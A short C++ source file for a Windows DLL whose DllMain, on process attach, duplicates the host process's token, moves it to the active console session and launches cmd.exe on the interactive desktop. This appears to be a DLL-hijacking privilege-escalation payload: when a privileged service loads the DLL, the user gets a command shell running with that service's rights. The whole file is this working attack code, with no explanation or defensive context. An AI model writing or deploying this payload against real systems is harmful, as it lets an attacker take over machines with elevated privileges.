#include <Windows.h>


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    STARTUPINFO startInfo = { 0x00 };
    startInfo.cb = sizeof(startInfo);
    startInfo.wShowWindow = SW_SHOW;
    startInfo.lpDesktop = const_cast<wchar_t*>(L"WinSta0\\Default");
    DWORD  sessionId = 0;
    PROCESS_INFORMATION procInfo = { 0x00 };

    HANDLE hToken = {};
  
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        sessionId = WTSGetActiveConsoleSessionId();

        OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken);
        DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, nullptr, SecurityAnonymous, TokenPrimary, &hToken);

        SetTokenInformation(hToken, TokenSessionId, &sessionId, sizeof(sessionId));
        if (CreateProcessAsUser(hToken,
            L"C:\\windows\\system32\\cmd.exe",
            NULL,
            nullptr,
            nullptr,
            FALSE,
            NORMAL_PRIORITY_CLASS | CREATE_NEW_CONSOLE,
            nullptr,
            nullptr,
            &startInfo,
            &procInfo
        )
            ) {
            CloseHandle(procInfo.hProcess);
            CloseHandle(procInfo.hThread);
        }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

